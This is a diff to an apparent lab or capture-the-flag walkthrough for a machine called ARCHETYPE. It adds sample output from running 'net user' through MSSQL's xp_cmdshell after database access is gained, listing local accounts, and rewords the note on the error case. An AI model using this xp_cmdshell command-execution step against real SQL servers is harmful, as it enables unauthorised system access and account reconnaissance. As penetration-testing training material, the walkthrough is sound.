@@ -30,7 +30,33 @@ Once we have access to the SQL database we can check if we can use the xp\_cmdsh
  EXEC xp_cmdshell 'net user';
 ```
 
-If we get the following result, we don't have access to the command and we need to reconfigure the service:
+Successful execution would produce an output similar to this:
+
+```
+output                                                                                                                                                                                                                                                            
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
+
+NULL                                                                                                                                                                                                                                                              
+
+User accounts for \\ARCHETYPE                                                                                                                                                                                                                                     
+
+NULL                                                                                                                                                                                                                                                              
+
+-------------------------------------------------------------------------------                                                                                                                                                                                   
+
+Administrator            DefaultAccount           Guest                                                                                                                                                                                                           
+
+sql_svc                  WDAGUtilityAccount                                                                                                                                                                                                                       
+
+The command completed successfully.                                                                                                                                                                                                                               
+
+NULL                                                                                                                                                                                                                                                              
+
+NULL                                                                                                                                                                                            
+```
+
+However, if we get the following ERROR, we don't have access to the command and we need to reconfigure the service:
 
 {% code overflow="wrap" %}
 ```bash
